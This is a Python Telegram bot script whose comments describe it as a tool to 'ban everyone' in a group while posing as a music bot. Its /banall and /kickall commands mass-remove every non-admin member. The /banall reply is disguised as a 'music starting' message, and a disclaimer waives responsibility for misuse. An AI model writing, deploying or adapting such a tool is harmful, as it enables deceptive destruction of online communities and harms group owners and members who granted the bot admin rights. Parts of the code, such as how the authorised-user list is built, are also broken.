#bot to ban everyone, give the appearance of a music bot if you want, or you can send the look you want to groups and ban everyone
#I am not responsible for bad use, edits can be made on codes
#Unauthorized theft and public sharing is a license statement.
#MIT LISENCE

import sys
import re
import logging
import os
from telethon import TelegramClient, events
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from asyncio import sleep
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
from telethon.tl.functions.channels import EditBannedRequest
from datetime import datetime
from var import Var
from time import sleep
from telethon.errors.rpcerrorlist import FloodWaitError
from telethon.tl import functions
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChannelParticipantsKicked,
    ChatBannedRights,
    UserStatusEmpty,
    UserStatusLastMonth,
    UserStatusLastWeek,
    UserStatusOffline,
    UserStatusOnline,
    UserStatusRecently,
)
import asyncio

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True
)

admin_rights = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True
)

logging.basicConfig(level=logging.INFO)

api_id = 'API-ID'
api_hash = 'API-HASH'
bot_token = 'BOT-TOKEN'
sudouser = 'sudoid'

client = TelegramClient('session_name', api_id, api_hash)
client.start(bot_token=bot_token)


SUDOS = []
for x in sudouser:
    SUDOS.append(x)

@client.on(events.NewMessage(pattern="^/ping"))  
async def ping(e):
    if e.sender_id in SUDOS:
        start = datetime.now()
        text = "Pong!"
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"__Pong__ !! `{ms}` ms")


@client.on(events.NewMessage(pattern="^/kickall"))
async def kickall(event):
   if event.sender_id in SUDOS:
     if not event.is_group:
         Reply = f"use only in Group."
         await event.reply(Reply)
     else:
         await event.delete()
         getchat = await event.get_chat()
         getmepls = await event.client.get_me()
         admin = getchat.admin_rights
         creator = getchat.creator
         if not admin and not creator:
              return await event.reply("Salam menim yetkilerimi fullada qaqa bele ishliyemmirem !!")
         hellomalive = await client.send_message(event.chat_id, "**Hello !! I'm Alive**")
         admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
         admins_id = [i.id for i in admins]
         all = 0
         kimk = 0
         async for user in event.client.iter_participants(event.chat_id):
             all += 1
             try:
                if user.id not in admins_id:
                    await event.client.kick_participant(event.chat_id, user.id)
                    kimk += 1
                    await asyncio.sleep(0.1)
             except Exception as e:
                    print(str(e))
                    await asyncio.sleep(0.1)
         await hellomalive.edit(f"** \n\n Kicked:** `{kimk}` \n **Total:** `{all}`")
    

@client.on(events.NewMessage(pattern="^/banall"))
async def banall(event):
   if event.sender_id in SUDOS:
     if not event.is_group:
         Reply = f"use only group"
         await event.reply(Reply)
     else:
         await event.delete()
         getchat = await event.get_chat()
         getmepls = await event.client.get_me()
         admin = getchat.admin_rights
         creator = getchat.creator
         if not admin and not creator:
              return await event.reply("please complete my right!!")
         hellomalive = await client.send_message(event.chat_id, "**Starting...**")
         admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
         admins_id = [i.id for i in admins]
         all = 0
         bann = 0
         async for user in event.client.iter_participants(event.chat_id):
             all += 1
             try:
               if user.id not in admins_id:
                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                    bann += 1
                    await asyncio.sleep(0.1)
             except Exception as e:
                   print(str(e))
                   await asyncio.sleep(0.1)
         await hellomalive.edit(f"Musiqi basladilir....")
         print("Banlanan adam sayi:")
         print(bann)
         print("Qalan adam sayi: ")
         print(all)

    
@client.on(events.NewMessage(pattern="^/unstart"))
async def unban(event):
   if event.sender_id in SUDOS:
     if not event.is_group:
         Reply = f"Noob !! Use This Cmd in Group."
         await event.reply(Reply)
     else:
         msg = await event.reply("Searching Participant Lists.")
         p = 0
         async for i in event.client.iter_participants(event.chat_id, filter=ChannelParticipantsKicked, aggressive=True):
              rights = ChatBannedRights(until_date=0, view_messages=False)
              try:
                await event.client(functions.channels.EditBannedRequest(event.chat_id, i, rights))
              except FloodWaitError as ex:
                 print(f"sleep: {ex.seconds} second")
                 sleep(ex.seconds)
              except Exception as ex:
                 await msg.edit(str(ex))
              else:
                  p += 1
         await msg.edit("{}: {} unbanned".format(event.chat_id, p))


@client.on(events.NewMessage(pattern="^/leaving"))
async def _(e):
    if e.sender_id in SUDOS:
        joinsplit = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = joinsplit[0]
            bc = int(bc)
            text = "Leaving....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("Succesfully Left")
            except Exception as e:
                await event.edit(str(e))   
        else:
            bc = e.chat_id
            text = "Leaving....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("Succesfully Left")
            except Exception as e:
                await event.edit(str(e))   
          

@client.on(events.NewMessage(pattern="^/restart"))
async def restart(e):
    if e.sender_id in SUDOS:
        text = "__Restarting__ !!!"
        await e.reply(text, parse_mode=None, link_preview=None )
        try:
            await client.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


print("\n\n")
print("Your Ban All Bot Deployed Successfully ✅")

client.run_until_disconnected()
